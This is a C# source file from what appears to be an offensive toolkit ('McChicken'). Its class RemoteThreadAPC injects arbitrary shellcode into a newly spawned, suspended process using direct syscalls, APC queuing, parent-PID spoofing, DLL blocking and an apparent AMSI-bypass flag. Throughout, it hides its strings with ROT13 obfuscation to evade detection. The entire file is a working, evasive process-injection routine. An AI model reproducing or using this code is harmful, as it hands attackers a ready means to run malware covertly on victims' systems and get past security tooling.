//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class RemoteThreadAPC
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                new string(@"P:\Jvaqbjf\Flfgrz32".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqNCP) [+] AgNyybpngrIveghnyZrzbel, CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqNCP) [+] AgJevgrIveghnyZrzbel, furyypbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqNCP) [+] AgCebgrpgIveghnyZrzbel, CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtOpenThread

            IntPtr hThread = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueThread = (IntPtr)pi.dwThreadId };

            ntstatus = Syscalls.NtOpenThread(
                ref hThread,
                DI.Data.Win32.Kernel32.ThreadAccess.SetContext,
                ref oa,
                ref ci);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqNCP) [+] AgBcraGuernq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtOpenThread: {ntstatus}");

            #endregion

            #region NtQueueApcThread

            ntstatus = Syscalls.NtQueueApcThread(
                hThread,
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqNCP) [+] AgDhrhrNcpGuernq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtQueueApcThread: {ntstatus}");

            #endregion

            #region NtAlertResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtAlertResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqNCP) [+] AgNyregErfhzrGuernq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtAlertResumeThread: {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}
